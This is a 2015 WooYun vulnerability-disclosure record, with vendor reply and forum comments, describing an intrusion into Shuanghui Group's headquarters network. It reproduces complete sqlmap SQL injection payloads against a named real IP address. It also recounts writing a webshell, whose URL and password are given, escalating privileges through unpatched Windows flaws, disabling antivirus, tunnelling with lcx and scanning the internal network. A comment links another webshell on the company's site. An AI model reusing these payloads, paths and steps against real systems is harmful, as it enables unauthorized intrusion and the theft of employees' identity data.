{"id": 9489, "wybug_id": "wooyun-2015-0120872", "wybug_title": "我是如何漫游双汇集团总部内网的(涉及大量内部资料/实时视频监控/所有员工身份证号等)", "wybug_corp": "双汇集团", "wybug_author": "超威蓝猫", "wybug_date": "2015-06-16 15:06", "wybug_open_date": "2015-08-05 08:02", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-05：\t细节向公众公开  简要描述： 荣获「食品安全终生成就奖」的企业对信息安全一点也不重视啊 ._. 详细说明：  早在今年一月，就有人报告了「双汇集团考勤管理系统未授权访问」这一漏洞(http://wooyun.org/bugs/wooyun-2010-094664)，泄漏员工姓名与身份证号。这个漏洞依然没有修复，同时这也是本次入侵双汇集团位于河南漯河总部的入口。wooyun-2010-094664 中提到，考勤管理系统登录页面 http://221.176.224.234/ 存在SQL注射：\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: TextBox1 (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __LASTFOCUS=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTc2OTQ2OTM4MQ9kFgICAw9kFgQCCQ8QDxYEHg1EYXRhVGV4dEZpZWxkBQJzah4LXyFEYXRhQm91bmRnZBAVNA/or7fpgInmi6nmnIjku70HMjAxNC0wOAcyMDE0LTExBzIwMTQtMDMHMjAxMS0wNgcyMDExLTA5BzIwMTUtMDEHMjAxNS0wMwcyMDEzLTA2BzIwMTQtMDUHMjAxMy0wOQcyMDExLTA1BzIwMTEtMTAHMjAxNC0wMQcyMDE1LTA1BzIwMTQtMTAHMjAxMy0xMAcyMDEyLTA1BzIwMTEtMDgHMjAxMy0wMwcyMDE0LTA2BzIwMTItMDEHMjAxNC0xMgcyMDEyLTAyBzIwMTItMTAHMjAxNS0wNgcyMDEzLTAyBzIwMTEtMTEHMjAxMi0wMwcyMDE0LTAyBzIwMTItMDgHMjAxMi0xMQcyMDEyLTEyBzIwMTUtMDIHMjAxMy0xMQcyMDEzLTA0BzIwMTEtMTIHMjAxMy0wNwcyMDEzLTAxBzIwMTUtMDQHMjAxMy0wOAcyMDEyLTA0BzIwMTMtMDUHMjAxMy0xMgcyMDE0LTA3BzIwMTQtMDkHMjAxNC0wNAcyMDEyLTA2BzIwMTEtMDQHMjAxMi0wNwcyMDExLTA3BzIwMTItMDkVNA/or7fpgInmi6nmnIjku70HMjAxNC0wOAcyMDE0LTExBzIwMTQtMDMHMjAxMS0wNgcyMDExLTA5BzIwMTUtMDEHMjAxNS0wMwcyMDEzLTA2BzIwMTQtMDUHMjAxMy0wOQcyMDExLTA1BzIwMTEtMTAHMjAxNC0wMQcyMDE1LTA1BzIwMTQtMTAHMjAxMy0xMAcyMDEyLTA1BzIwMTEtMDgHMjAxMy0wMwcyMDE0LTA2BzIwMTItMDEHMjAxNC0xMgcyMDEyLTAyBzIwMTItMTAHMjAxNS0wNgcyMDEzLTAyBzIwMTEtMTEHMjAxMi0wMwcyMDE0LTAyBzIwMTItMDgHMjAxMi0xMQcyMDEyLTEyBzIwMTUtMDIHMjAxMy0xMQcyMDEzLTA0BzIwMTEtMTIHMjAxMy0wNwcyMDEzLTAxBzIwMTUtMDQHMjAxMy0wOAcyMDEyLTA0BzIwMTMtMDUHMjAxMy0xMgcyMDE0LTA3BzIwMTQtMDkHMjAxNC0wNAcyMDEyLTA2BzIwMTEtMDQHMjAxMi0wNwcyMDExLTA3BzIwMTItMDkUKwM0Z2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2RkAg0PPCsADQEADxYEHwFnHgtfIUl0ZW1Db3VudGZkZBgBBQlHcmlkVmlldzEPPCsACgEIZmSl3KpxbOgbM+nQ2IVReHAz9RY4UA==&TextBox1=a' AND 9450=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (9450=9450) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(122)+CHAR(112)+CHAR(113))) AND 'Ankx'='Ankx&TextBox2=6/5/2015&DropDownList1=%E8%AF%B7%E9%80%89%E6%8B%A9%E6%9C%88%E4%BB%BD&Button2=%E6%9F%A5%E8%AF%A2    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __LASTFOCUS=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTc2OTQ2OTM4MQ9kFgICAw9kFgQCCQ8QDxYEHg1EYXRhVGV4dEZpZWxkBQJzah4LXyFEYXRhQm91bmRnZBAVNA/or7fpgInmi6nmnIjku70HMjAxNC0wOAcyMDE0LTExBzIwMTQtMDMHMjAxMS0wNgcyMDExLTA5BzIwMTUtMDEHMjAxNS0wMwcyMDEzLTA2BzIwMTQtMDUHMjAxMy0wOQcyMDExLTA1BzIwMTEtMTAHMjAxNC0wMQcyMDE1LTA1BzIwMTQtMTAHMjAxMy0xMAcyMDEyLTA1BzIwMTEtMDgHMjAxMy0wMwcyMDE0LTA2BzIwMTItMDEHMjAxNC0xMgcyMDEyLTAyBzIwMTItMTAHMjAxNS0wNgcyMDEzLTAyBzIwMTEtMTEHMjAxMi0wMwcyMDE0LTAyBzIwMTItMDgHMjAxMi0xMQcyMDEyLTEyBzIwMTUtMDIHMjAxMy0xMQcyMDEzLTA0BzIwMTEtMTIHMjAxMy0wNwcyMDEzLTAxBzIwMTUtMDQHMjAxMy0wOAcyMDEyLTA0BzIwMTMtMDUHMjAxMy0xMgcyMDE0LTA3BzIwMTQtMDkHMjAxNC0wNAcyMDEyLTA2BzIwMTEtMDQHMjAxMi0wNwcyMDExLTA3BzIwMTItMDkVNA/or7fpgInmi6nmnIjku70HMjAxNC0wOAcyMDE0LTExBzIwMTQtMDMHMjAxMS0wNgcyMDExLTA5BzIwMTUtMDEHMjAxNS0wMwcyMDEzLTA2BzIwMTQtMDUHMjAxMy0wOQcyMDExLTA1BzIwMTEtMTAHMjAxNC0wMQcyMDE1LTA1BzIwMTQtMTAHMjAxMy0xMAcyMDEyLTA1BzIwMTEtMDgHMjAxMy0wMwcyMDE0LTA2BzIwMTItMDEHMjAxNC0xMgcyMDEyLTAyBzIwMTItMTAHMjAxNS0wNgcyMDEzLTAyBzIwMTEtMTEHMjAxMi0wMwcyMDE0LTAyBzIwMTItMDgHMjAxMi0xMQcyMDEyLTEyBzIwMTUtMDIHMjAxMy0xMQcyMDEzLTA0BzIwMTEtMTIHMjAxMy0wNwcyMDEzLTAxBzIwMTUtMDQHMjAxMy0wOAcyMDEyLTA0BzIwMTMtMDUHMjAxMy0xMgcyMDE0LTA3BzIwMTQtMDkHMjAxNC0wNAcyMDEyLTA2BzIwMTEtMDQHMjAxMi0wNwcyMDExLTA3BzIwMTItMDkUKwM0Z2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2RkAg0PPCsADQEADxYEHwFnHgtfIUl0ZW1Db3VudGZkZBgBBQlHcmlkVmlldzEPPCsACgEIZmSl3KpxbOgbM+nQ2IVReHAz9RY4UA==&TextBox1=a'; WAITFOR DELAY '0:0:5'--&TextBox2=6/5/2015&DropDownList1=%E8%AF%B7%E9%80%89%E6%8B%A9%E6%9C%88%E4%BB%BD&Button2=%E6%9F%A5%E8%AF%A2    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __LASTFOCUS=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUKMTc2OTQ2OTM4MQ9kFgICAw9kFgQCCQ8QDxYEHg1EYXRhVGV4dEZpZWxkBQJzah4LXyFEYXRhQm91bmRnZBAVNA/or7fpgInmi6nmnIjku70HMjAxNC0wOAcyMDE0LTExBzIwMTQtMDMHMjAxMS0wNgcyMDExLTA5BzIwMTUtMDEHMjAxNS0wMwcyMDEzLTA2BzIwMTQtMDUHMjAxMy0wOQcyMDExLTA1BzIwMTEtMTAHMjAxNC0wMQcyMDE1LTA1BzIwMTQtMTAHMjAxMy0xMAcyMDEyLTA1BzIwMTEtMDgHMjAxMy0wMwcyMDE0LTA2BzIwMTItMDEHMjAxNC0xMgcyMDEyLTAyBzIwMTItMTAHMjAxNS0wNgcyMDEzLTAyBzIwMTEtMTEHMjAxMi0wMwcyMDE0LTAyBzIwMTItMDgHMjAxMi0xMQcyMDEyLTEyBzIwMTUtMDIHMjAxMy0xMQcyMDEzLTA0BzIwMTEtMTIHMjAxMy0wNwcyMDEzLTAxBzIwMTUtMDQHMjAxMy0wOAcyMDEyLTA0BzIwMTMtMDUHMjAxMy0xMgcyMDE0LTA3BzIwMTQtMDkHMjAxNC0wNAcyMDEyLTA2BzIwMTEtMDQHMjAxMi0wNwcyMDExLTA3BzIwMTItMDkVNA/or7fpgInmi6nmnIjku70HMjAxNC0wOAcyMDE0LTExBzIwMTQtMDMHMjAxMS0wNgcyMDExLTA5BzIwMTUtMDEHMjAxNS0wMwcyMDEzLTA2BzIwMTQtMDUHMjAxMy0wOQcyMDExLTA1BzIwMTEtMTAHMjAxNC0wMQcyMDE1LTA1BzIwMTQtMTAHMjAxMy0xMAcyMDEyLTA1BzIwMTEtMDgHMjAxMy0wMwcyMDE0LTA2BzIwMTItMDEHMjAxNC0xMgcyMDEyLTAyBzIwMTItMTAHMjAxNS0wNgcyMDEzLTAyBzIwMTEtMTEHMjAxMi0wMwcyMDE0LTAyBzIwMTItMDgHMjAxMi0xMQcyMDEyLTEyBzIwMTUtMDIHMjAxMy0xMQcyMDEzLTA0BzIwMTEtMTIHMjAxMy0wNwcyMDEzLTAxBzIwMTUtMDQHMjAxMy0wOAcyMDEyLTA0BzIwMTMtMDUHMjAxMy0xMgcyMDE0LTA3BzIwMTQtMDkHMjAxNC0wNAcyMDEyLTA2BzIwMTEtMDQHMjAxMi0wNwcyMDExLTA3BzIwMTItMDkUKwM0Z2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2RkAg0PPCsADQEADxYEHwFnHgtfIUl0ZW1Db3VudGZkZBgBBQlHcmlkVmlldzEPPCsACgEIZmSl3KpxbOgbM+nQ2IVReHAz9RY4UA==&TextBox1=a' WAITFOR DELAY '0:0:5'--&TextBox2=6/5/2015&DropDownList1=%E8%AF%B7%E9%80%89%E6%8B%A9%E6%9C%88%E4%BB%BD&Button2=%E6%9F%A5%E8%AF%A2---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000current user is DBA:    Trueavailable databases [7]:[*] model[*] msdb[*] Northwind[*] pubs[*] sygs[*] sygsaa[*] tempdb\n找到物理路径之后写入webshell: \n\n得到：http://221.176.224.234/indexbak.aspx 密码-7这台服务器上有功能残缺的360，但ms11-080和ms11-046等漏洞未修补，可提权。提权后干掉直接360(360在win2003表现不怎样)，lcx反射端口，连接远程桌面。\n\n\n\n扫描下常用端口\n\nmask 区域\n*****.0.1**********.0.7**********.0.1**********.100:**********.100:**********.101:**********.102:**********.103:**********.166:**********.180:**********.181:**********.181:**********.182:**********.185:**********.185:**********.182:**********.186:**********.186:**********.184:**********.184:**********.183:**********.183:**********.210:**********.210:**********.210:**********.210:**********.245:**********.245:**********.245:**********.249:**********.249:**********.247:**********.247:**********.0.2*****\n\n大致摸清了双汇总部内网结构：\n\n\n\n\n\n\n\n共享文件太多了，屏幕太小截一部分吧\n\n   漏洞证明：  如上。   修复方案：  \n\n   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-06-21 08:00 厂商回复： cnvd确认并复现所述情况，已经由cnvd通过网站管理单位公开联系渠道向其邮件通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-16 15:07 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个影响太大了，看cert能一起帮忙联系企业修复    \n     2015-06-16 15:08 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  @疯狗 双汇 归国家管？    \n     2015-06-16 15:09 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  荣获「食品安全终生成就奖」的企业对信息安全一点也不重视啊 ._.    \n     2015-06-16 15:13 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @’‘Nome 之前联系未果，太传统的企业，cert兴许能帮忙联系到相关负责人    \n     2015-06-21 09:24 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @疯狗 双汇，阿萨姆，红牛，可口可乐，农夫山泉都没人管安全问题，国内居前列的都是知名品牌阿    \n     2015-06-21 10:04 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  http://www.shuanghui.net/shsk/spider%20Php%20shell.php 站出来，双汇保证不打屎你-。-    \n     2015-06-21 10:53 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  @小龙 这是你的shell么？    \n     2015-06-21 11:00 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @’‘Nome  应该是洞主的吧，我google到的    \n     2015-07-13 16:18 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  @小龙 并不是。    \n     2015-08-05 08:40 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  内网系统并没有拿下什么啊    \n     2015-08-05 23:53 |    \t\t金馆长 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | Up)\t\t \n  我有知识我自豪！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}